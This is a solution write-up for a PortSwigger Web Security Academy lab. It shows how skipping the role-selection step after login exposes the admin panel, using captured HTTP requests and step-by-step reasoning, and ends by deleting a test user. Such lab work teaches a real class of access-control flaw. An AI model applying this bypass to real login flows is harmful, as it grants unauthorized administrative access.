# [Lab 8: Authentication bypass via flawed state machine](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine)

---

## Description

This lab makes flawed assumptions about the sequence of events in the login process. To solve the lab, exploit this flaw to bypass the lab's authentication, access the admin interface, and delete Carlos.

You can log in to your own account using the following credentials: `wiener:peter`

---

## Solution

### Site Map

- `/`
	- Home page with product links
- `/product?productId=$PRODUCT_ID`
	- Product page
- `/login`
	- `GET`
		- Login form
	- `POST`
		- [Submit login form](08%20-%20Authentication%20bypass%20via%20flawed%20state%20machine.md#^55eef8)
		- Upon successful authentication, redirects to `/role-selector`
- `/my-account`
	- When unauthenticated, redirects to `/login`
	- When authenticated, allows current user to update email address
- `/role-selector`
	- `GET`: Dropdown form for user to select their role
		- Choices: `User` or `Content author`
	- `POST`:
		- Choose role from dropdown
			- [Choosing `User`](08%20-%20Authentication%20bypass%20via%20flawed%20state%20machine.md#^694768)
			- [Choosing `Content author`](08%20-%20Authentication%20bypass%20via%20flawed%20state%20machine.md#^36a140)
		- If authenticated at `/login`, redirects to `/` after choosing arbitrary role
		- If didn't authenticated at `/login`, returns a 400 with body `No login credentials provided`
- `/admin`
	- Administrative interface

### Login Process

Login request:

```http
POST /login HTTP/1.1
Host: ac2d1f401fe17f6780d19587000b007a.web-security-academy.net
Cookie: session=AeVmb0rhIyUdj4ma4GTvObl1fJb3FvFI
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: https://ac2d1f401fe17f6780d19587000b007a.web-security-academy.net
Dnt: 1
Referer: https://ac2d1f401fe17f6780d19587000b007a.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

csrf=y86dFfTV4dgoueayaA8JDwS2oWvv5dP5&username=wiener&password=peter
```

^55eef8

Upon successful authentication, server grants `session` cookie and redirects to `/role-selector`.

![](images/Pasted%20image%2020210828225642.png)

Interestingly, the application's response to `GET /role-selector` changes the value of `session` cookie again.

Selecting `User` role request:

```http
POST /role-selector HTTP/1.1
Host: ac2d1f401fe17f6780d19587000b007a.web-security-academy.net
Cookie: session=53GTJrF7P0C4lDbXgrlTU0ulGjwehamz
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
Origin: https://ac2d1f401fe17f6780d19587000b007a.web-security-academy.net
Dnt: 1
Referer: https://ac2d1f401fe17f6780d19587000b007a.web-security-academy.net/role-selector
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

role=user&csrf=8zRMIAeYaDeznA0p8Z0b4HAyOLMf7umX
```

^694768

Selecting `Content author`:

```http
POST /role-selector HTTP/1.1
Host: ac2d1f401fe17f6780d19587000b007a.web-security-academy.net
Cookie: session=CCoUjij2b0VWPAdAVAPe2pppJBgsOiyS
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: https://ac2d1f401fe17f6780d19587000b007a.web-security-academy.net
Dnt: 1
Referer: https://ac2d1f401fe17f6780d19587000b007a.web-security-academy.net/role-selector
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

role=content-author&csrf=oqkOb79zqO1w2c6q7aYG6EJVuR7OD21Q
```

^36a140

Upon submission of an arbitrary role (not just `user` or `content-author`), the application redirects to `/` and grants another `session` cookie. With this cookie, the user is authenticated.

### Analysis

So a successful submission to `/login` grants a `session` cookie and redirects to `/role-selector`, which promptly grants another `session` cookie. After a successful submission to `/role-selector`, the application grants another `session` cookie.

Is it possible to skip `/login`? Accessing `/role-selector` without first successfully authenticating to `/login` renders the role selection form, but submitting the form results in the error `No login credentials provided`. This even occurs when attempting to go through `/role-selector` again AFTER going successfully going through `/role-selector`. The application enforces that users go through `/login` first effectively.

So it won't work to skip going through `/login`. Is it possible to skip `/role-selector` and go straight to `/admin` after going through `/login`? The cookie from `/login` should really only be good for successfully getting through `/role-selector`, but perhaps it will grant more access.

Submit the login request with the credentials `wiener:peter`.

```http
POST /login HTTP/1.1
Host: ac2d1f401fe17f6780d19587000b007a.web-security-academy.net
Cookie: session=smgsbrIG1vA0UkWt57BJ07MWVUhk9p95
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: https://ac2d1f401fe17f6780d19587000b007a.web-security-academy.net
Dnt: 1
Referer: https://ac2d1f401fe17f6780d19587000b007a.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

csrf=fTvURdXYkONhrTD64zhNKoifxWXVUzLs&username=wiener&password=peter
```

Drop the subsequent `GET` request to `/role-selector`, which keeps the cookie from the successful submission to `/login`. Navigate to `/admin` to find that the administrative interface is accessible. Delete `carlos`'  account and complete the challenge.

![](images/Pasted%20image%2020210828235015.png)
